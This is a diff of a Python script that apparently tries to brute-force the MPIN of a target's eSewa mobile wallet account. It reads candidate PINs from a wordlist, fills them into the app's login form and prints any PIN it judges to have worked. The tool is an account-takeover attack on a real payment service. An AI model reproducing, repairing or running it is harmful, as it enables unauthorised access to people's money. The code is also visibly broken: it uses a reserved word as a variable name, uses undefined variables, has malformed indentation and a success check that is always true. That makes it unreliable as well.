@@ -18,24 +18,22 @@ print('\n--v1.1.3------**[~~@V.CYPHER*~~]/coded by:VICKY**------v1.1.3--\n')
 file = open('mpins.txt', 'r')
 
 MobileNumber = input('Enter Mobile Number: ').strip()
-print("\nTarget Mobile Number: ", MobileNumber)
+print("\nTarget Mobile Number (+977): ", MobileNumber)
 print("\nTrying MPIN's from list ...")
 
 i = 0
 while True:
-    passw = file.readline().strip()
+    pass = file.readline().strip()
     i += 1
-    if len(passw) < 4:
+    if len(pass) < 4:
         continue
-    print(str(i) + " : " + passw)
+    print(str(i) + " : " + pass)
     try:
-        response = d(resourceId="com.esewa.android:id/toolbar_login/register").click()
         if response.code == 200:
-        .select_form(nr=0)
-            # You need to complete the form filling with the correct form fields
-            .form['MobileNumber'] = mobile number
-            .form['MPIN'] = passw
-            response = .submit()
+        d.select_form(nr=0)
+            d.form['MobileNumber'] = mobile number
+            d.form['MPIN'] = passw
+            response = d.submit()
             response_data = response.read()
             if 'response_data' or 'Two-factor authentication' in response_data or 'security code' in response_data:
                 print('Your mpin is : ', passw)
